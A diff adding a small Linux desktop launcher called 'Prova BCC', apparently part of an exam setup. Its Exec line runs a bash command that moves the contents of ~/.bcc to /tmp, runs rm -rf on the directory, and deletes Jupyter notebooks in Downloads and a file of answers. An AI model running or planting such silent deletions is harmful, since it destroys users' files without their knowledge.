@@ -1,0 +1,4 @@
+[Desktop Entry]
+Name=Prova BCC
+Exec=/bin/bash -c 'mkdir -p /tmp/prochazka; mv ~/.bcc/* /tmp/prochazka 2> /dev/null; rm -rf ~/.bcc; rm -f ~/Downloads/*.ipynb respostas.pdf'
+Type=Application
